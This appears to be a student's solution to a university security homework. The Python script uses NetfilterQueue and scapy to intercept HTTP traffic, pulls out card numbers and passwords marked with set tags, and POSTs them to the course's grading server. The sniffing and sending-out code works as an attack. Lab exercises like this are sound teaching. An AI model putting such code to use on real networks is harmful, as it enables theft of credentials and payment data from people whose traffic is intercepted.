from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests

secrets = set()

def callback(pkt):
    ip = IP(pkt.get_payload())
    if ip[TCP].dport == 80:
        if ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            fields = http.split("\r\n")
            data = fields[-1]
            # Looking for card numbers according to the specifics
            if "cc ---" in data:
                card_number = data.split("cc --- ",1)[1].split(" ")[0]
                if (card_number.replace(".", "").isdigit() or card_number.replace('/', '').isdigit()) and len(card_number) == 19:
                    prev_len = len(secrets)
                    secrets.add(card_number)
                    if prev_len != len(secrets):
                        print("Found new card number")
                        print("Number of secrets found: " + str(len(secrets)) + "\n")

            # Looking for passwords according to the specifics
            if "pwd ---" in data:
               password = data.split("pwd --- ",1)[1].split(" ")[0]
               if len(password) >= 8 and len(password) <=30 and (not any(c.islower() for c in password)):
                   prev_len = len(secrets)
                   secrets.add(password)
                   if prev_len != len(secrets):
                       print("Found new password")
                       print("Number of secrets found: " + str(len(secrets)) + "\n")

            # When I find 5 secrets, I send them
            if len(secrets) == 5:
                json_data = {"student_email": "andrea.piccione@epfl.ch", "secrets": list(secrets)}
                # Sending new paket
                print("Sending secrets\n")
                r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=json_data)
                print("Server response:")
                print(r.status_code, r.reason)
                print("\nServer message:")
                print(r.text)
                print("\nMission completed! You can now stop the traffic with CTRL + C\n")

    pkt.accept()


# Starting looking at the traffic
nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)
print("Looking for packets with secrets...\n")

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
